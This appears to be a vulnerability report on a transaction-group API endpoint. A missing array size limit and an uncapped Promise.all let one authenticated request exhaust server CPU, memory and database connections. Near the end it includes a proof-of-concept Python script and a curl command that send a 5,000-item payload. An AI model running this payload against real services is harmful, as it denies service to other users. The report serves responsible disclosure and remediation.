### Title
Unbounded Batch Size in `createTransactionGroup` Enables Single-Request Resource Exhaustion DoS

### Summary
The `POST /transaction-groups` endpoint accepts a `groupItems` array with no upper-bound constraint. A single authenticated user can submit a group containing thousands of items, triggering a parallel `Promise.all` of CPU-intensive cryptographic validation operations per item, exhausting server CPU, memory, and database connections in a single request. The developer acknowledged the analogous gap in the signature-import path with an inline comment but left the group-creation path unguarded.

### Finding Description

**Root cause — missing `@ArrayMaxSize` on `CreateTransactionGroupDto.groupItems`:**

`CreateTransactionGroupDto` accepts an unbounded array:

```typescript
// back-end/apps/api/src/transactions/dto/create-transaction-group.dto.ts
@IsArray()
@IsNotEmpty()
@ValidateNested({ each: true })
@Type(() => CreateTransactionGroupItemDto)
groupItems: CreateTransactionGroupItemDto[];   // ← no @ArrayMaxSize(N)
``` [1](#0-0) 

The controller passes the DTO directly to the service with no additional size check:

```typescript
// back-end/apps/api/src/transactions/groups/transaction-groups.controller.ts
createTransactionGroup(@GetUser() user: User, @Body() dto: CreateTransactionGroupDto)
``` [2](#0-1) 

**Unbounded parallel processing in `createTransactions`:**

`createTransactionGroup` extracts all transaction DTOs and passes them to `createTransactions`, which fans them out with `Promise.all` — all items processed simultaneously:

```typescript
// back-end/apps/api/src/transactions/transactions.service.ts  line 409
const validatedData = await Promise.all(
  dtos.map(dto => this.validateAndPrepareTransaction(dto, user, client)),
);
``` [3](#0-2) 

Each `validateAndPrepareTransaction` call performs:
- `PublicKey.verify(transactionBytes, signature)` — asymmetric crypto
- `SDKTransaction.fromBytes(...)` — protobuf deserialization
- `sdkTransaction.getTransactionHash()` — SHA-384 hash
- `isTransactionBodyOverMaxSize` / `isTransactionValidForNodes` — additional parsing [4](#0-3) 

After validation, all records are saved in a single DB transaction and reminders are scheduled for every item:

```typescript
await manager.save(Transaction, transactions);  // N rows in one shot
await Promise.all(reminderPromises);            // N scheduler entries
``` [5](#0-4) 

**Developer-acknowledged gap in the sibling endpoint:**

The `importSignatures` path contains an explicit developer note that a limit is needed but was never applied to the group-creation path:

```typescript
//Added a batch mechanism, probably should limit this on the api side of things
const BATCH_SIZE = 500;
``` [6](#0-5) 

The `uploadSignatureMap` controller also accepts an unbounded array (`UploadSignatureMapDto | UploadSignatureMapDto[]`) and fans it out with `Promise.all`: [7](#0-6) [8](#0-7) 

### Impact Explanation
A single authenticated request with `N` group items causes `N` concurrent asymmetric-crypto + protobuf-parse + hash operations. At a few thousand items the Node.js event loop stalls, memory spikes from holding all transaction byte buffers simultaneously, and the PostgreSQL connection pool saturates from the bulk insert. The API service becomes unresponsive to all other users for the duration of the request, constituting a denial-of-service achievable by any registered user with no special privileges.

### Likelihood Explanation
Any registered user of the organization backend can reach `POST /transaction-groups` — authentication is required but no elevated role is needed. The front-end client constructs groups automatically (e.g., `MultipleAccountUpdateRequestHandler`, `BigFileOrganizationRequestHandler`), so the endpoint is a normal production path. Crafting a JSON body with thousands of `groupItems` entries requires only a standard HTTP client.

### Recommendation
1. Add `@ArrayMaxSize(N)` (e.g., `N = 100` or a configurable constant) to `groupItems` in `CreateTransactionGroupDto`.
2. Add the same constraint to the `UploadSignatureMapDto[]` array accepted by `uploadSignatureMap` (the developer's own comment at line 575 already flags this).
3. Replace the uncapped `Promise.all` in `createTransactions` with a concurrency-limited executor (e.g., process items in chunks of 10–20) so that even if the DTO limit is bypassed, the server degrades gracefully rather than crashing.

### Proof of Concept

```bash
# Authenticated as any registered user
TOKEN="<valid JWT>"

# Build a payload with 5000 group items (each with a minimal but structurally valid body)
python3 -c "
import json, base64
item = {
  'seq': 0,
  'transaction': {
    'name': 'x', 'description': '',
    'transactionBytes': 'AAAA',   # will fail crypto check but still parsed
    'signature': 'AAAA',
    'creatorKeyId': 1,
    'mirrorNetwork': 'testnet'
  }
}
print(json.dumps({'description':'dos','atomic':False,'sequential':False,
                  'groupItems':[item]*5000}))
" > payload.json

curl -X POST https://<api-host>/transaction-groups \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d @payload.json
```

The server spawns 5,000 concurrent `validateAndPrepareTransaction` coroutines. Even though each item ultimately fails signature verification, the `Promise.all` holds all 5,000 in flight simultaneously, saturating the event loop and memory. Legitimate requests time out for the duration.

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction-group.dto.ts (L24-28)
```typescript
  @IsArray()
  @IsNotEmpty()
  @ValidateNested({ each: true })
  @Type(() => CreateTransactionGroupItemDto)
  groupItems: CreateTransactionGroupItemDto[];
```

**File:** back-end/apps/api/src/transactions/groups/transaction-groups.controller.ts (L45-50)
```typescript
  createTransactionGroup(
    @GetUser() user: User,
    @Body() dto: CreateTransactionGroupDto,
  ): Promise<TransactionGroup> {
    return this.transactionGroupsService.createTransactionGroup(user, dto);
  }
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L408-411)
```typescript
      // Validate all DTOs upfront
      const validatedData = await Promise.all(
        dtos.map(dto => this.validateAndPrepareTransaction(dto, user, client)),
      );
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L457-478)
```typescript
        try {
          return await entityManager.save(Transaction, transactions);
        } catch (error) {
          throw new BadRequestException(ErrorCodes.FST);
        }
      });

      // Batch schedule reminders
      const reminderPromises = savedTransactions
        .map((tx, index) => {
          const dto = dtos[index];
          if (!dto.reminderMillisecondsBefore) return null;

          const remindAt = new Date(tx.validStart.getTime() - dto.reminderMillisecondsBefore);
          return this.schedulerService.addReminder(
            getTransactionSignReminderKey(tx.id),
            remindAt,
          );
        })
        .filter(Boolean);

      await Promise.all(reminderPromises);
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L575-576)
```typescript
    //Added a batch mechanism, probably should limit this on the api side of things
    const BATCH_SIZE = 500;
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L896-978)
```typescript
  private async validateAndPrepareTransaction(
    dto: CreateTransactionDto,
    user: User,
    client: Client,
  ) {
    const creatorKey = user.keys.find(key => key.id === dto.creatorKeyId);

    if (!creatorKey) {
      throw new BadRequestException(`Creator key ${dto.creatorKeyId} not found`);
    }

    const publicKey = PublicKey.fromString(creatorKey.publicKey);

    // Verify signature
    const validSignature = publicKey.verify(dto.transactionBytes, dto.signature);
    if (!validSignature) {
      throw new BadRequestException(ErrorCodes.SNMP);
    }

    // Parse SDK transaction
    const sdkTransaction = SDKTransaction.fromBytes(dto.transactionBytes);

    // Check the transaction is frozen, cannot require it to be frozen, breaks backwards compatibility
    if (!sdkTransaction.isFrozen()) {
      sdkTransaction.freezeWith(client);
    }

    // Check if expired
    if (isExpired(sdkTransaction)) {
      throw new BadRequestException(ErrorCodes.TE);
    }

    // Check size
    if (isTransactionBodyOverMaxSize(sdkTransaction)) {
      throw new BadRequestException(ErrorCodes.TOS);
    }

    // Check nodes
    const allowedNodes = getNodeAccountIdsFromClientNetwork(client);
    if (!isTransactionValidForNodes(sdkTransaction, allowedNodes)) {
      throw new BadRequestException(ErrorCodes.TNVN);
    }

    const transactionHash = await sdkTransaction.getTransactionHash();
    const transactionType = getTransactionTypeEnumValue(sdkTransaction);

    // Extract new keys if applicable
    let publicKeys: string[] | null = null;
    try {
      let keyToExtract: Key | null = null;

      if (transactionType === TransactionType.ACCOUNT_UPDATE) {
        keyToExtract = (sdkTransaction as AccountUpdateTransaction).key;
      } else if (transactionType === TransactionType.NODE_UPDATE) {
        keyToExtract = (sdkTransaction as NodeUpdateTransaction).adminKey;
      } else if (transactionType === TransactionType.NODE_CREATE) {
        keyToExtract = (sdkTransaction as NodeCreateTransaction).adminKey;
      }

      if (keyToExtract) {
        publicKeys = flattenKeyList(keyToExtract).map(pk => pk.toStringRaw());
      }
    } catch (error) {
      // Log but don't fail - publicKeys will remain null
      console.error(`Failed to extract public keys from transaction ${sdkTransaction.transactionId}:`, error);
    }

    return {
      name: dto.name,
      type: transactionType,
      description: dto.description,
      transactionId: sdkTransaction.transactionId.toString(),
      transactionHash: encodeUint8Array(transactionHash),
      transactionBytes: sdkTransaction.toBytes(),
      unsignedTransactionBytes: sdkTransaction.toBytes(),
      creatorKeyId: dto.creatorKeyId,
      signature: dto.signature,
      mirrorNetwork: dto.mirrorNetwork,
      validStart: sdkTransaction.transactionId.validStart.toDate(),
      isManual: dto.isManual,
      cutoffAt: dto.cutoffAt,
      publicKeys,
    };
```

**File:** back-end/apps/api/src/transactions/signers/signers.controller.ts (L102-107)
```typescript
  async uploadSignatureMap(
    @Body() body: UploadSignatureMapDto | UploadSignatureMapDto[],
    @GetUser() user: User,
    @Query('includeNotifications') includeNotifications?: boolean,
  ): Promise<TransactionSigner[] | UploadSignatureMapResponseDto> {
    const transformedSignatureMaps = await transformAndValidateDto(UploadSignatureMapDto, body);
```

**File:** back-end/apps/api/src/transactions/signers/signers.service.ts (L167-198)
```typescript
    return Promise.all(
      dto.map(async ({ id, signatureMap: map }) => {
        try {
          const transaction = transactionMap.get(id);
          if (!transaction) return { id, error: ErrorCodes.TNF };

          // Validate transaction status
          const statusError = this.validateTransactionStatus(transaction);
          if (statusError) return { id, error: statusError };

          // Process signatures
          const { sdkTransaction, userKeys, isSameBytes } = await this.processTransactionSignatures(
            transaction,
            map,
            userKeyMap,
            signersByTransaction.get(id) || new Set()
          );

          return {
            id,
            transaction,
            sdkTransaction,
            userKeys,
            isSameBytes,
            error: null,
          };
        } catch (err) {
          console.error(`[TX ${id}] Error:`, err.message);
          return { id, error: err.message };
        }
      })
    );
```
